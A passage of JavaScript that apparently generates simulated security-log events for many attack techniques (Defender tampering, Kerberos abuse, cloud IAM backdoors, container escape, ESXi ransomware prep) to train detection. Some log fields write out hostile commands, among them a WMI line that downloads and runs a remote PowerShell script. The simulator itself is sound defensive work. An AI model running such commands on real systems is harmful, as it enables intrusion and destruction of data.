    'defender-disabled': {
      label: 'Defender Disabled', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(['Administrator', 'svc_deploy']);
        const cmd = 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true';
        return [
          sym(h, 3, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', userDomain: `CORP\\${u}`,
            sysmonFields: [`CommandLine="${cmd}"`, 'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"'],
            message: `Process Create: ${cmd}`,
          }),
          win(h, 3, 4688, { user: u,
            message: 'EventID=4688 A new process has been created. Process=powershell.exe CommandLine="Add-MpPreference -ExclusionPath C:\\ProgramData"' }),
        ];
      },
    },
    'bloodhound': {
      label: 'BloodHound AD Recon', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS), src = rand.internalIp(), evs = [];
        evs.push(sym(h, 4, 1, 'Process Create', {
          image: 'C:\\Users\\Public\\SharpHound.exe', userDomain: `CORP\\${u}`, srcIp: src,
          sysmonFields: ['CommandLine="SharpHound.exe --CollectionMethods All --Domain corp.local --ZipFileName corp.zip"',
            'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="Medium"'],
          message: 'Process Create: SharpHound.exe --CollectionMethods All --Domain corp.local',
        }));
        // The collector then walks the directory — a burst of object reads no
        // ordinary workstation ever produces.
        const objs = ['user', 'group', 'computer', 'organizationalUnit', 'groupPolicyContainer', 'trustedDomain'];
        for (let i = 0, n = rand.int(11, 15); i < n; i++) {
          evs.push(win(h, 5, 4662, { user: u, srcIp: src,
            message: `EventID=4662 An operation was performed on a Directory Service Object. ObjectType=${rand.pick(objs)} AccessMask=0x100 Account=${u} Properties=Read Property` }));
        }
        return evs;
      },
    },
    'psexec-lateral': {
      label: 'PsExec Lateral Movement', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), src = rand.internalIp(), u = rand.pick(['Administrator', 'svc_admin']);
        return [
          win(h, 5, 4624, { user: u, srcIp: src,
            message: `EventID=4624 An account was successfully logged on. Account=${u} LogonType=3 LogonProcess=NtLmSsp AuthenticationPackage=NTLM Source=${src}` }),
          win(h, 5, 5140, { user: u, srcIp: src,
            message: `EventID=5140 A network share object was accessed. ShareName=\\\\*\\ADMIN$ Account=${u} Source=${src}` }),
          win(h, 3, 7045, { user: u, srcIp: src, program: 'Service Control Manager',
            message: 'EventID=7045 A service was installed in the system. ServiceName=PSEXESVC ServiceFileName=%SystemRoot%\\PSEXESVC.exe ServiceType=user mode service StartType=demand start Account=LocalSystem' }),
        ];
      },
    },
    'golden-ticket': {
      label: 'Golden Ticket', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
        const src = rand.internalIp();
        // A forged TGT is minted offline from the krbtgt hash, so the DC never
        // filled in the domain field — a blank "Account Domain: -" on 4769 is the
        // classic artefact, alongside a lifetime far past policy.
        return [win(h, 3, 4769, { user: 'FAKE_ADMIN', srcIp: src,
          message: `EventID=4769 A Kerberos service ticket was requested. Account Name: FAKE_ADMIN Account Domain: - ServiceName=krbtgt TicketEncryptionType=0x12 (AES256) TicketOptions=0x40810000 Client=${src}` })];
      },
    },
    'asrep-roast': {
      label: 'AS-REP Roasting', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
        const src = rand.internalIp();
        // Accounts flagged "do not require Kerberos preauthentication" hand an
        // AS-REP to anyone who asks — crackable offline, no failed logon logged.
        return ['svc_legacy', 'svc_scan', 'helpdesk', 'kiosk'].slice(0, rand.int(3, 4)).map((u) =>
          win(h, 4, 4768, { user: u, srcIp: src,
            message: `EventID=4768 A Kerberos authentication ticket (TGT) was requested. Account Name: ${u} Pre-Authentication Type: 0 TicketEncryptionType=0x17 (RC4-HMAC) Result Code: 0x0 Client=${src}` }));
      },
    },

    // ---- Cloud control plane (AWS CloudTrail) --------------------------------
    'cloud-logging-disabled': {
      label: 'Cloud Logging Disabled', category: 'attack',
      build() {
        const u = rand.pick(['svc_deploy', 'ci-runner', 'jdoe']), a = rand.pick(THREAT_INTEL.ips);
        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
        const trail = `arn:aws:cloudtrail:us-east-1:${AWS_ACCOUNT}:trail/org-audit-trail`;
        return [
          aws({ user: u, arn, srcIp: a, eventSource: 'cloudtrail.amazonaws.com', eventName: 'StopLogging',
            requestParameters: { name: trail },
            message: `StopLogging on org-audit-trail by ${u} from ${a}` }),
          aws({ user: u, arn, srcIp: a, eventSource: 'cloudtrail.amazonaws.com', eventName: 'DeleteTrail',
            requestParameters: { name: trail },
            message: `DeleteTrail org-audit-trail by ${u} from ${a}` }),
          aws({ user: u, arn, srcIp: a, eventSource: 'guardduty.amazonaws.com', eventName: 'DeleteDetector',
            requestParameters: { detectorId: rand.hex(32) },
            message: `DeleteDetector (GuardDuty) by ${u} from ${a}` }),
        ];
      },
    },
    'cloud-iam-backdoor': {
      label: 'Cloud IAM Backdoor', category: 'attack',
      build() {
        const u = rand.pick(['svc_deploy', 'ci-runner']), a = rand.pick(THREAT_INTEL.ips);
        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
        const victim = `svc_${rand.id().slice(0, 5)}`;
        return [
          aws({ user: u, arn, srcIp: a, eventName: 'CreateUser', requestParameters: { userName: victim },
            message: `CreateUser ${victim} by ${u} from ${a}` }),
          aws({ user: u, arn, srcIp: a, eventName: 'CreateAccessKey', requestParameters: { userName: victim },
            responseElements: { accessKey: { accessKeyId: `AKIA${rand.hex(16).toUpperCase()}`, userName: victim, status: 'Active' } },
            message: `CreateAccessKey for ${victim} by ${u} from ${a}` }),
          aws({ user: u, arn, srcIp: a, eventName: 'CreateLoginProfile',
            requestParameters: { userName: victim, passwordResetRequired: false },
            message: `CreateLoginProfile for ${victim} by ${u} from ${a}` }),
        ];
      },
    },
    'cloud-privesc': {
      label: 'Cloud Privilege Escalation', category: 'attack',
      build() {
        const u = rand.pick(['svc_deploy', 'ci-runner']), a = rand.pick(THREAT_INTEL.ips);
        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
        return [
          aws({ user: u, arn, srcIp: a, eventName: 'AttachUserPolicy',
            requestParameters: { userName: u, policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' },
            message: `AttachUserPolicy AdministratorAccess to ${u} from ${a}` }),
          aws({ user: u, arn, srcIp: a, eventName: 'PutUserPolicy',
            requestParameters: { userName: u, policyName: 'inline-all',
              policyDocument: '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' },
            message: `PutUserPolicy inline-all (Action *) for ${u} from ${a}` }),
        ];
      },
    },
    's3-exposure': {
      label: 'S3 Bucket Exposed', category: 'attack',
      build() {
        const u = rand.pick(['svc_deploy', 'jdoe']), a = rand.pick(THREAT_INTEL.ips);
        const arn = `arn:aws:iam::${AWS_ACCOUNT}:user/${u}`;
        const bucket = rand.pick(['corp-finance-reports', 'corp-hr-exports', 'corp-db-backups']);
        return [
          aws({ user: u, arn, srcIp: a, eventSource: 's3.amazonaws.com', eventName: 'PutPublicAccessBlock',
            requestParameters: { bucketName: bucket,
              PublicAccessBlockConfiguration: { BlockPublicAcls: false, IgnorePublicAcls: false, RestrictPublicBuckets: false } },
            message: `PutPublicAccessBlock disabled on ${bucket} by ${u} from ${a}` }),
          aws({ user: u, arn, srcIp: a, eventSource: 's3.amazonaws.com', eventName: 'PutBucketAcl',
            requestParameters: { bucketName: bucket, 'x-amz-acl': 'public-read',
              AccessControlPolicy: { Grantee: 'http://acs.amazonaws.com/groups/global/AllUsers', Permission: 'READ' } },
            message: `PutBucketAcl public-read (AllUsers) on ${bucket} by ${u} from ${a}` }),
          aws({ user: u, arn, srcIp: a, eventSource: 's3.amazonaws.com', eventName: 'PutBucketPolicy',
            requestParameters: { bucketName: bucket,
              bucketPolicy: '{"Effect":"Allow","Principal":"*","Action":"s3:GetObject"}' },
            message: `PutBucketPolicy Principal * on ${bucket} by ${u} from ${a}` }),
        ];
      },
    },

    // ---- Identity provider (Okta) --------------------------------------------
    'impossible-travel': {
      label: 'Impossible Travel', category: 'attack',
      build() {
        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
        const name = who.split('@')[0];
        const far = rand.pick([GEO.moscow, GEO.lagos, GEO.shenzhen]);
        // Two successful sign-ins, minutes apart, from cities no aircraft covers
        // in the gap. Both succeed — only the geography gives it away.
        return [
          Object.assign(idp({ user: who, displayName: name, oktaEventType: 'user.session.start',
            displayMessage: 'User login to Okta', srcIp: rand.ip(),
            message: `user.session.start SUCCESS ${who} from ${GEO.sydney.city}/${GEO.sydney.country}` }), GEO.sydney),
          Object.assign(idp({ user: who, displayName: name, severity: 4, oktaSeverity: 'WARN',
            oktaEventType: 'user.session.start', displayMessage: 'User login to Okta',
            srcIp: rand.pick(THREAT_INTEL.ips), isProxy: true,
            message: `user.session.start SUCCESS ${who} from ${far.city}/${far.country}` }), far),
        ];
      },
    },
    'mfa-fatigue': {
      label: 'MFA Fatigue (Push Bombing)', category: 'attack',
      build() {
        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
        const geo = rand.pick([GEO.moscow, GEO.lagos, GEO.shenzhen]);
        const a = rand.pick(THREAT_INTEL.ips), evs = [];
        const push = (extra) => Object.assign(idp(Object.assign({
          user: who, displayName: who.split('@')[0], srcIp: a, isProxy: true, factor: 'push',
          credType: 'OTP', oktaEventType: 'user.authentication.auth_via_mfa',
          displayMessage: 'Authentication of user via MFA',
        }, extra)), geo);
        for (let i = 0, n = rand.int(8, 12); i < n; i++) {
          evs.push(push({ severity: 4, oktaSeverity: 'WARN', outcome: 'FAILURE',
            outcomeReason: 'FAILED_PUSH_VERIFY_REJECTED',
            message: `user.authentication.auth_via_mfa FAILURE push rejected ${who} from ${geo.city}/${geo.country}` }));
        }
        // The user eventually taps Approve just to stop the prompts.
        evs.push(push({ severity: 2, oktaSeverity: 'WARN', outcome: 'SUCCESS',
          message: `user.authentication.auth_via_mfa SUCCESS push accepted ${who} from ${geo.city}/${geo.country}` }));
        return evs;
      },
    },

    // ---- Evasion & stealth ----------------------------------------------------
    // The Picus Red Report 2026 puts 80% of the top-ten techniques in evasion and
    // persistence rather than destruction; these five cover the ones the app was
    // missing from that list.
    'process-injection': {
      label: 'Process Injection', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
        const src = 'C:\\Users\\Public\\updater.exe', tgt = 'C:\\Windows\\System32\\svchost.exe';
        return [
          sym(h, 3, 8, 'CreateRemoteThread detected', {
            image: src, userDomain: `CORP\\${u}`,
            sysmonFields: [`SourceImage="${src}"`, `TargetImage="${tgt}"`,
              `NewThreadId=${rand.int(4000, 9000)}`, 'StartFunction="LoadLibraryA"',
              `StartAddress="0x00007FF9${rand.hex(8).toUpperCase()}"`,
              'StartModule="C:\\Windows\\System32\\kernel32.dll"'],
            message: `CreateRemoteThread detected: ${src} -> ${tgt} StartFunction=LoadLibraryA`,
          }),
          sym(h, 3, 10, 'Process accessed', {
            image: src, userDomain: `CORP\\${u}`,
            sysmonFields: [`SourceImage="${src}"`, `TargetImage="${tgt}"`, 'GrantedAccess="0x1F3FFF"',
              'CallTrace="UNKNOWN(00007FF9C0D2A1B4)|kernelbase.dll+2A1C"'],
            message: `Process accessed: ${src} -> ${tgt} GrantedAccess=0x1F3FFF (PROCESS_ALL_ACCESS)`,
          }),
        ];
      },
    },
    'browser-cred-theft': {
      label: 'Browser Credential Theft', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
        const thief = 'C:\\Users\\Public\\sync.exe';
        // Chrome's saved passwords live in an SQLite DB; the key that decrypts
        // them is in Local State. Reading both is the whole attack.
        return [
          sym(h, 3, 11, 'File created', {
            image: thief, userDomain: `CORP\\${u}`,
            sysmonFields: [`TargetFilename="C:\\Users\\${u}\\AppData\\Local\\Temp\\Login Data.tmp"`],
            message: `File created: copy of "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" by ${thief}`,
          }),
          sym(h, 3, 11, 'File created', {
            image: thief, userDomain: `CORP\\${u}`,
            sysmonFields: [`TargetFilename="C:\\Users\\${u}\\AppData\\Local\\Temp\\Local State.tmp"`],
            message: `File created: copy of "AppData\\Local\\Google\\Chrome\\User Data\\Local State" (DPAPI master key) by ${thief}`,
          }),
        ];
      },
    },
    'masquerading': {
      label: 'Masquerading (fake svchost)', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
        const fake = rand.pick([
          ['svchost.exe', 'C:\\Users\\Public\\svchost.exe'],
          ['lsass.exe', 'C:\\ProgramData\\lsass.exe'],
          ['csrss.exe', 'C:\\Users\\Public\\Downloads\\csrss.exe'],
        ]);
        // A real svchost.exe only ever runs from System32 and only ever as a child
        // of services.exe. Both are wrong here.
        return [sym(h, 3, 1, 'Process Create', {
          image: fake[1], userDomain: `CORP\\${u}`,
          sysmonFields: [`CommandLine="${fake[1]} -k netsvcs"`,
            'ParentImage="C:\\Users\\Public\\installer.exe"', 'IntegrityLevel="Medium"',
            `OriginalFileName="${rand.id()}.exe"`, `Hashes="SHA256=${rand.hex(64).toUpperCase()}"`],
          message: `Process Create: ${fake[0]} running from ${fake[1]} (not System32), parent=installer.exe`,
        })];
      },
    },
    'remote-access-tool': {
      label: 'Remote Access Tool Install', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
        const rat = rand.pick([
          ['ScreenConnect.ClientService.exe', 'instance-x7z2q1.screenconnect.com'],
          ['AnyDesk.exe', 'boot-01.net.anydesk.com'],
          ['TeamViewer_Service.exe', 'router12.teamviewer.com'],
        ]);
        const dst = rand.ip();
        // Legitimate software, installed by someone who should not be installing
        // it — the fastest-growing initial-access route into a network.
        return [
          sym(h, 4, 1, 'Process Create', {
            image: `C:\\Users\\${u}\\AppData\\Local\\Temp\\${rat[0]}`, userDomain: `CORP\\${u}`,
            sysmonFields: [`CommandLine="${rat[0]} /silent /install"`,
              'ParentImage="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"',
              'IntegrityLevel="High"'],
            message: `Process Create: remote access tool ${rat[0]} /silent /install from AppData\\Local\\Temp`,
          }),
          sym(h, 4, 3, 'Network connect', {
            image: `C:\\Users\\${u}\\AppData\\Local\\Temp\\${rat[0]}`, userDomain: `CORP\\${u}`,
            srcIp: h.ip, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: 443,
            sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${dst}"`,
              `DestinationHostname="${rat[1]}"`, 'DestinationPort=443', 'Initiated="true"'],
            message: `Network connect: ${rat[0]} -> ${rat[1]}:443 (unmanaged remote access session)`,
          }),
        ];
      },
    },
    'sandbox-evasion': {
      label: 'Sandbox / VM Evasion', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
        const dropper = 'C:\\Users\\Public\\invoice.exe';
        // Malware fingerprints the host before unpacking: if it looks like an
        // analysis VM it exits clean. The checks themselves are the detection.
        return [
          sym(h, 4, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\wbem\\WMIC.exe', userDomain: `CORP\\${u}`,
            sysmonFields: ['CommandLine="wmic.exe path win32_computersystem get model,manufacturer"',
              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
            message: 'Process Create: wmic.exe path win32_computersystem get model,manufacturer (VM artefact check)',
          }),
          sym(h, 4, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\reg.exe', userDomain: `CORP\\${u}`,
            sysmonFields: ['CommandLine="reg.exe query HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions"',
              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
            message: 'Process Create: reg.exe query HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions (VM artefact check)',
          }),
          sym(h, 4, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\cmd.exe', userDomain: `CORP\\${u}`,
            sysmonFields: ['CommandLine="cmd.exe /c ping -n 120 127.0.0.1 > nul"',
              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
            message: 'Process Create: cmd.exe /c ping -n 120 127.0.0.1 (sleep to outlast the sandbox)',
          }),
        ];
      },
    },

    // ---- Covert channels & exfiltration --------------------------------------
    'tor-egress': {
      label: 'Tor Egress', category: 'attack',
      build() {
        const src = rand.internalIp(), u = rand.pick(USERS), evs = [];
        for (let i = 0, n = rand.int(4, 6); i < n; i++) {
          const guard = `${rand.int(1, 223)}.${rand.int(0, 255)}.${rand.int(0, 255)}.${rand.int(1, 254)}`;
          evs.push(sqd({
            srcIp: src, user: u, method: 'CONNECT', url: `${guard}:${rand.pick([9001, 9030, 9051])}`,
            squidCode: 'TCP_TUNNEL', bytes: rand.int(80000, 1400000), elapsed: rand.int(60000, 400000),
            peerHost: guard, contentType: '-', torExit: true,
            message: `TCP_TUNNEL/200 CONNECT ${guard}:9001`,
          }));
        }
        return evs;
      },
    },
    'saas-c2': {
      label: 'C2 over Trusted SaaS', category: 'attack',
      build() {
        const src = rand.internalIp(), u = rand.pick(USERS), evs = [];
        // Red Report 2026: crews now route C2 through high-reputation services so
        // the destination reputation check passes. The *cadence* is the tell.
        const svc = rand.pick([
          ['api.openai.com', '/v1/chat/completions'],
          ['api.telegram.org', `/bot${rand.hex(10)}/sendMessage`],
          ['raw.githubusercontent.com', `/${rand.id()}/config/main/task.txt`],
          ['discord.com', `/api/webhooks/${rand.int(1e17, 9e17)}/${rand.hex(24)}`],
        ]);
        for (let i = 0, n = rand.int(6, 8); i < n; i++) {
          evs.push(sqd({
            srcIp: src, user: u, method: rand.chance(0.5) ? 'POST' : 'GET',
            url: `https://${svc[0]}${svc[1]}`, squidCode: 'TCP_MISS', status: 200,
            bytes: 512 + rand.int(0, 24), elapsed: rand.int(120, 260),
            peerHost: svc[0], contentType: 'application/json', beaconTo: svc[0],
            message: `TCP_MISS/200 POST https://${svc[0]}${svc[1]}`,
          }));
        }
        return evs;
      },
    },
    'cloud-exfil': {
      label: 'Exfil to Cloud Storage', category: 'attack',
      build() {
        const src = rand.internalIp(), u = rand.pick(USERS);
        const svc = rand.pick(['mega.nz', 'anonfiles.com', 'transfer.sh', 'dropbox.com']);
        const mb = rand.int(900, 3200);
        // One PUT carrying more than the host normally sends in a month, to a
        // consumer file-drop the business does not use.
        return [sqd({
          srcIp: src, user: u, method: 'PUT', url: `https://${svc}/upload/${rand.id()}`,
          squidCode: 'TCP_MISS', status: 200, bytes: mb * 1024 * 1024,
          elapsed: rand.int(200000, 900000), peerHost: svc, contentType: 'application/octet-stream',
          message: `TCP_MISS/200 PUT https://${svc}/upload — ${mb} MB outbound`,
        })];
      },
    },

    // ---- Network edge & infrastructure ---------------------------------------
    'net-config-tamper': {
      label: 'Network Config Tampering', category: 'attack',
      build() {
        const host = rand.pick(['SW-CORE-01', 'RTR-EDGE-02']);
        const a = rand.pick(THREAT_INTEL.ips);
        let seq = rand.int(100000, 900000);
        const io = (sev, fac, mnem, msg) => ({
          srcType: 'ciscoios', vendor: 'ciscoios', host, hostIp: '10.0.0.2',
          facility: FACILITY.local7, program: 'ios', seq: seq++,
          severity: sev, iosFacility: fac, mnemonic: mnem, user: 'admin', srcIp: a, message: msg,
        });
        // Blinding the device before moving through it: drop the ACL, then stop
        // it talking to the collector at all.
        return [
          io(5, 'SEC_LOGIN', 'LOGIN_SUCCESS', `Login Success [user: admin] [Source: ${a}] [localport: 22]`),
          io(5, 'SYS', 'CONFIG_I', `Configured from vty0 (${a}) by admin: no ip access-group INBOUND_FILTER in`),
          io(5, 'SYS', 'CONFIG_I', `Configured from vty0 (${a}) by admin: no logging host 10.0.0.100`),
        ];
      },
    },
    'citrix-exploit': {
      label: 'Citrix Gateway Exploit', category: 'attack',
      build() {
        const host = 'ns-gw-01', nsip = '10.0.0.42', vip = '203.0.113.20';
        const a = rand.pick(THREAT_INTEL.ips);
        let msgId = rand.int(30000, 99000);
        const ns = (sev, mod, evt, sig, msg) => ({
          srcType: 'citrix', vendor: 'citrix', host, hostIp: nsip, facility: FACILITY.local0,
          program: 'ns', nsMsgId: msgId++, severity: sev, nsModule: mod, nsEvent: evt,
          srcIp: a, dstIp: vip, threatSig: sig, threatSev: sig ? 'critical' : undefined, message: msg,
        });
        // An unauthenticated session appearing with no preceding LOGIN is the
        // shape of every NetScaler session-token bug.
        return [
          ns(2, 'APPFW', 'APPFW_MEMORY_OVERFLOW', 'NetScaler Gateway buffer overflow (CVE-2023-4966 CitrixBleed)',
            `Context unknown@${a} - Vserver ${vip}:443 - Total_bytes_send 0 - Message "Memory overflow in nsppe, oversized Host header"`),
          ns(3, 'SSLVPN', 'HTTPREQUEST', null,
            `Context unknown@${a} - SessionId: 0 - User "" - Client_ip ${a} - Vserver ${vip}:443 - Total_bytes_send 4194304 - Url /oauth/idp/.well-known/openid-configuration`),
          ns(3, 'SSLVPN', 'TCPCONNSTAT', null,
            `Context reused-session@${a} - SessionId: 4242 - User administrator - Client_ip ${a} - Nat_ip "Mapped Ip" - Vserver ${vip}:443 - Browser_type "python-requests/2.31.0" - Group(s) "Domain Admins"`),
        ];
      },
    },
    'vpn-cred-stuffing': {
      label: 'VPN Credential Stuffing', category: 'attack',
      build() {
        const host = 'ns-gw-01', nsip = '10.0.0.42', vip = '203.0.113.20';
        const a = rand.pick(THREAT_INTEL.ips);
        let msgId = rand.int(30000, 99000);
        const users = ['jdoe', 'asmith', 'mchen', 'kwalsh', 'operator', 'svc_vpn',
          'administrator', 'guest', 'helpdesk', 'contractor'];
        // One password, many accounts, one source — a credential dump being
        // replayed against the perimeter.
        return users.map((u) => ({
          srcType: 'citrix', vendor: 'citrix', host, hostIp: nsip, facility: FACILITY.local0,
          program: 'ns', nsMsgId: msgId++, severity: 4, nsModule: 'AAA', nsEvent: 'LOGIN_FAILED',
          user: u, srcIp: a,
          message: `User ${u} - Client_ip ${a} - Nat_ip "Mapped Ip" - Vserver ${vip}:443 ` +
            `- Browser_type "python-requests/2.31.0" - Failure_reason "External authentication server denied access"`,
        }));
      },
    },

    // ---- Virtualisation & containers ------------------------------------------
    'esxi-ransomware': {
      label: 'ESXi Ransomware Prep', category: 'attack',
      build() {
        const a = rand.pick(THREAT_INTEL.ips);
        // Encrypting datastores beats encrypting guests: one host, every VM. The
        // prep is always the same — turn on SSH, drop lockdown, stop the VMs.
        return [
          esx({ srcIp: a, message: `Event ${rand.int(900000, 999999)} : SSH session was opened for 'root@${a}'` }),
          esx({ srcIp: a, esxSub: 'Hostsvc.HostAccessManager',
            message: `Event ${rand.int(900000, 999999)} : Lockdown mode disabled for the host by root@${a}` }),
          esx({ srcIp: a, severity: 3, esxLevel: 'error',
            message: `Event ${rand.int(900000, 999999)} : SRV-DB-01 on esxi-01.corp.local in ha-datacenter is powered off by root@${a}` }),
          esx({ srcIp: a, severity: 2, esxLevel: 'error', daemon: 'Vpxa', program: 'Vpxa', esxSub: 'vpxaVmprovUtil',
            message: `Event ${rand.int(900000, 999999)} : /bin/sh -c "esxcli vm process kill --type=force --world-id=all" executed by root@${a}` }),
        ];
      },
    },
    'k8s-container-escape': {
      label: 'Container Escape (K8s)', category: 'attack',
      build() {
        const a = rand.pick(THREAT_INTEL.ips), ns = rand.pick(['production', 'payments']);
        // A privileged pod with hostPID and the node root mounted is a container
        // escape written as a manifest — no exploit required.
        return [
          k8s({ verb: 'create', k8sResource: 'pods', namespace: ns, objectName: 'debug-shell',
            srcIp: a, user: 'system:serviceaccount:default:default', groups: ['system:serviceaccounts'],
            requestUri: `/api/v1/namespaces/${ns}/pods`, privileged: true,
            message: `create pods/debug-shell in ${ns} — privileged:true hostPID:true hostNetwork:true hostPath:/ mounted at /host` }),
          k8s({ verb: 'create', k8sResource: 'pods/exec', namespace: ns, objectName: 'debug-shell',
            srcIp: a, user: 'system:serviceaccount:default:default', status: 101,
            requestUri: `/api/v1/namespaces/${ns}/pods/debug-shell/exec?command=nsenter&command=--target&command=1&command=--mount&command=--sh`,
            message: `create pods/exec into debug-shell in ${ns} — nsenter --target 1 --mount (break out to the node)` }),
          k8s({ verb: 'get', k8sResource: 'secrets', namespace: 'kube-system', objectName: 'cluster-admin-token',
            srcIp: a, user: 'system:serviceaccount:default:default', status: 200, auditLevel: 'RequestResponse',
            requestUri: '/api/v1/namespaces/kube-system/secrets/cluster-admin-token',
            message: 'get secrets/cluster-admin-token in kube-system — service-account token read' }),
        ];
      },
    },

    // ---- Identity provider (Entra ID) -----------------------------------------
    'legacy-auth-bypass': {
      label: 'Legacy Auth MFA Bypass', category: 'attack',
      build() {
        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
        const a = rand.pick(THREAT_INTEL.ips);
        // IMAP/POP/SMTP AUTH predate modern auth: they cannot present an MFA
        // challenge, so Conditional Access reports notApplied and the sign-in
        // succeeds on a password alone.
        return ['IMAP4', 'POP3', 'SMTP Auth'].slice(0, rand.int(2, 3)).map((app) => ent({
          user: who, displayName: who.split('@')[0], clientApp: app, srcIp: a,
          interactive: false, compliant: false, caStatus: 'notApplied',
          riskLevel: 'high', riskDetail: 'unfamiliarFeatures', riskState: 'atRisk',
          authRequirement: 'singleFactorAuthentication',
          city: 'Lagos', countryCode: 'NG', lat: 6.52, lon: 3.37,
          message: `Sign-in SUCCESS ${who} via ${app} from Lagos/NG (CA notApplied, single-factor, risk high)`,
        }));
      },
    },
    'oauth-consent-phish': {
      label: 'OAuth Consent Phishing', category: 'attack',
      build() {
        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local']);
        const appName = rand.pick(['Corp Doc Viewer', 'Secure Mail Sync', 'HR Onboarding Assistant']);
        const appId = rand.uuid();
        // The victim grants a rogue app long-lived mailbox scopes. Nothing is
        // "compromised" — the tokens are legitimate, and a password reset does
        // not revoke them.
        return [
          ent({ user: who, displayName: who.split('@')[0], appName, appId, srcIp: rand.ip(),
            city: 'Sydney', countryCode: 'AU', lat: -33.86, lon: 151.21,
            oauthConsent: true, consentScopes: 'Mail.ReadWrite Mail.Send offline_access Files.Read.All',
            message: `Consent granted to third-party application "${appName}" by ${who} — scopes: Mail.ReadWrite, Mail.Send, offline_access, Files.Read.All` }),
          ent({ user: who, displayName: who.split('@')[0], appName, appId,
            clientApp: 'Other clients', srcIp: rand.pick(THREAT_INTEL.ips), interactive: false,
            caStatus: 'notApplied', authRequirement: 'singleFactorAuthentication',
            city: 'Moscow', countryCode: 'RU', lat: 55.75, lon: 37.61,
            message: `Sign-in SUCCESS ${who} via "${appName}" service principal from Moscow/RU (non-interactive, refresh token)` }),
        ];
      },
    },

    // ---- Active Directory ------------------------------------------------------
    'gpo-modification': {
      label: 'GPO Modification', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
        const u = rand.pick(['svc_backup', 'helpdesk']);
        // A Group Policy Object is a scheduled task that runs everywhere. Editing
        // the Default Domain Policy is domain-wide code execution.
        return [
          win(h, 3, 5136, { user: u, srcIp: rand.internalIp(),
            message: `EventID=5136 A directory service object was modified. ObjectClass=groupPolicyContainer ObjectDN=CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local AttributeName=versionNumber Type=Value Added Account=${u}` }),
          win(h, 3, 5136, { user: u, srcIp: rand.internalIp(),
            message: `EventID=5136 A directory service object was modified. ObjectClass=groupPolicyContainer ObjectDN=CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local AttributeName=gPCMachineExtensionNames Type=Value Added Account=${u} (Scheduled Tasks extension added)` }),
        ];
      },
    },
    'adcs-esc1': {
      label: 'ADCS Certificate Theft (ESC1)', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
        const u = rand.pick(['jdoe', 'asmith', 'contractor']);
        const src = rand.internalIp();
        // A template that lets the requester supply the subject lets any user
        // request a certificate *as* the domain admin — and a certificate
        // survives a password reset.
        return [
          win(h, 3, 4886, { user: u, srcIp: src, program: 'Microsoft-Windows-Security-Auditing',
            message: `EventID=4886 Certificate Services received a certificate request. RequestID=${rand.int(1000, 9999)} Requester=CORP\\${u} Template=UserAuthentication Attributes=SAN:upn=administrator@corp.local` }),
          win(h, 2, 4887, { user: u, srcIp: src, program: 'Microsoft-Windows-Security-Auditing',
            message: `EventID=4887 Certificate Services approved a certificate request and issued a certificate. RequestID=${rand.int(1000, 9999)} Requester=CORP\\${u} Template=UserAuthentication SubjectAltName=administrator@corp.local Disposition=Issued` }),
        ];
      },
    },
    'wmi-lateral': {
      label: 'WMI Lateral Movement', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(['Administrator', 'svc_admin']);
        const tgt = rand.internalIp();
        // wmic /node: spawns a process on the remote host with no service
        // install and no file on disk — the quiet alternative to PsExec.
        return [
          sym(h, 3, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\wbem\\WMIC.exe', userDomain: `CORP\\${u}`,
            sysmonFields: [`CommandLine="wmic.exe /node:${tgt} /user:CORP\\\\${u} process call create \\"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://${rand.pick(THREAT_INTEL.ips)}/a.ps1')\\""`,
